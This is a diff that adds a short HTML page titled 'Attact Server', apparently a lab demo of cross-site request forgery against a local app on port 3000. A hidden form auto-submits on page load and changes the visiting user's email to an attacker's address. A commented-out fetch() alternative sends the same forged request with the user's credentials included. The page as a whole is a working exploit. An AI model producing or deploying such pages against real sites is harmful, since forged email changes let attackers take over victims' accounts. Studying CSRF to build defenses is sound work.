@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attact Server</title>
+</head>
+
+<body>
+
+    <h1>Website Attack</h1>
+
+    <form name="form" action="http://localhost:3000/edit" method="post">
+        <input type="hidden" name="email" value="attack@attack.com">
+    </form>
+
+    <script>
+        document.form.submit();
+
+        /*
+            fetch('http://localhost:3000/edit', {
+                method: 'POST',
+                credentials: 'include',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: 'email=hacker@hacker.com',
+            })
+                .then(res => console.log(res.status))
+                .catch(error => console.log(error))
+        */
+    </script>
+
+</body>
+
+</html>
